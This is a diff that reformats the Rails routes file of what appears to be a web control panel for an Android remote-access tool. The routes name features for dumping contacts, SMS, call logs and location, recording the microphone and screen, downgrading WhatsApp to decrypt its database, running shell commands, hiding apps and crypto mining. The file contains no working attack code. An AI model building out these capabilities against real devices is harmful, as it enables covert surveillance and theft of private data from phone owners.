@@ -3,92 +3,85 @@ Rails.application.routes.draw do
   resources :apk_payloads
   resources :contacts do
     collection do
-        post :dump_contacts
+      post :dump_contacts
     end
-end
-resources :geo_locations do
-  collection do
-      get :dump_location
   end
-end
+  resources :geo_locations do
+    collection do
+      get :dump_location
+    end
+  end
   resources :sms_messages do
     collection do
-        post :dump_messages
-        post :send_sms
+      post :dump_messages
+      post :send_sms
     end
-end
+  end
   resources :call_logs do
     collection do
-        post :dump_calllogs
+      post :dump_calllogs
     end
-end
+  end
   resources :recordings do
     collection do
       post :microphone_rec
+    end
   end
-end
-resources :messaging_apps_dumps do
-  collection do
-    get :uninstall_whatsapp_for_downgrade
-    get :install_old_apk
-    get :adb_backup
-    get :extract_backup
-    get :untar_backup
-    get :pull_whatsapp_db
-    get :decrypt_whatsapp_database
-    post :export_whatsapp_database
+  resources :messaging_apps_dumps do
+    collection do
+      get :uninstall_whatsapp_for_downgrade
+      get :install_old_apk
+      get :adb_backup
+      get :extract_backup
+      get :untar_backup
+      get :pull_whatsapp_db
+      get :decrypt_whatsapp_database
+      post :export_whatsapp_database
+    end
   end
-end
-resources :screenshots do
-  collection do
+  resources :screenshots do
+    collection do
       get :dump_screen_snap
       post :screen_record
-      
+    end
   end
-end
   resources :pictures do
     collection do
-        post :take_picture
+      post :take_picture
     end
-end
+  end
 
   resources :smartphones do
     collection do
-        get :load
-        get :check_connection
-        post :install 
-        post :front_camera_snap
-        post :select_smartphone
-        post :take_picture
-        post :dump_sysinfo
-        post :set_audio_mode
-        post :dump_localtime
-        post :uninstall_app
-        post :install_app
-        post :uninstall_app
-        post :list_apps
-        post :open_app
-        post :wake_lock
-        post :dump_wifi_info
-        get :webcam_record
-        get :upload_file
-        post :run_shell_command
-        post :dump_device_info
-        post :pull_file
-        get :hide_app
-        get :show_app
-        get :crypto_minner
-
-
-
-
+      get :load
+      get :check_connection
+      post :install
+      post :front_camera_snap
+      post :select_smartphone
+      post :take_picture
+      post :dump_sysinfo
+      post :set_audio_mode
+      post :dump_localtime
+      post :uninstall_app
+      post :install_app
+      post :uninstall_app
+      post :list_apps
+      post :open_app
+      post :wake_lock
+      post :dump_wifi_info
+      get :webcam_record
+      get :upload_file
+      post :run_shell_command
+      post :dump_device_info
+      post :pull_file
+      get :hide_app
+      get :show_app
+      get :crypto_minner
     end
   end
-  
+
   devise_for :admin_users, ActiveAdmin::Devise.config
   ActiveAdmin.routes(self)
   # For details on the DSL available within this file, see https://guides.rubyonrails.org/routing.html
- 
 
 end
-
